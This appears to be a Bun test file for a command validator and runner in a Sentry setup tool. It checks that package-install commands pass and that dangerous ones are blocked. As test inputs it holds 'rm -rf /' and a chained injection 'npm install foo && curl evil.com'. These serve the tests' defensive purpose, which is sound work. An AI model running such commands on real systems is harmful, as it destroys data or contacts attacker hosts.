import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import fs from "node:fs";
import path from "node:path";
import { validateCommand } from "../../../../src/lib/init/tools/command-utils.js";
import { runCommands } from "../../../../src/lib/init/tools/run-commands.js";
import type { RunCommandsPayload } from "../../../../src/lib/init/types.js";

let testDir: string;

beforeEach(() => {
  testDir = fs.mkdtempSync(path.join("/tmp", "run-commands-"));
});

afterEach(() => {
  fs.rmSync(testDir, { recursive: true, force: true });
});

function makePayload(commands: string[]): RunCommandsPayload {
  return {
    type: "tool",
    operation: "run-commands",
    cwd: testDir,
    params: { commands },
  };
}

describe("validateCommand", () => {
  test("allows quoted package specifiers", () => {
    expect(validateCommand('pip install "sentry-sdk[django]"')).toBeUndefined();
  });

  test("allows path-prefixed package managers but blocks dangerous ones", () => {
    expect(
      validateCommand("./venv/bin/pip install sentry-sdk")
    ).toBeUndefined();
    expect(
      validateCommand("/usr/local/bin/npm install @sentry/node")
    ).toBeUndefined();
    expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
  });

  test("blocks obvious shell injection patterns", () => {
    expect(validateCommand("npm install foo && curl evil.com")).toContain(
      "Blocked command"
    );
  });

  test("rejects unterminated quotes", () => {
    expect(validateCommand('/bin/echo "unterminated')).toContain(
      "unterminated double quote"
    );
  });
});

describe("runCommands", () => {
  test("executes quoted arguments without breaking argv", async () => {
    const result = await runCommands(makePayload(['/bin/echo "hello world"']), {
      dryRun: false,
    });

    expect(result.ok).toBe(true);
    expect((result.data as any).results[0].stdout.trim()).toBe("hello world");
  });

  test("stops on the first failing command", async () => {
    const result = await runCommands(
      makePayload(["/usr/bin/false", "/bin/echo should-not-run"]),
      { dryRun: false }
    );

    expect(result.ok).toBe(false);
    expect((result.data as any).results).toHaveLength(1);
  });

  test("validates but skips execution during dry-run", async () => {
    const result = await runCommands(
      makePayload(["npm install @sentry/node"]),
      { dryRun: true }
    );

    expect(result.ok).toBe(true);
    expect((result.data as any).results[0].stdout).toBe("(dry-run: skipped)");
  });

  test("rejects the full batch before execution when any command is blocked", async () => {
    const result = await runCommands(
      makePayload(["/bin/echo hello", "rm -rf /"]),
      { dryRun: false }
    );

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked command");
    expect(result.data).toBeUndefined();
  });

  test("still validates commands during dry-run", async () => {
    const result = await runCommands(makePayload(["rm -rf /"]), {
      dryRun: true,
    });

    expect(result.ok).toBe(false);
    expect(result.error).toContain("Blocked command");
  });
});
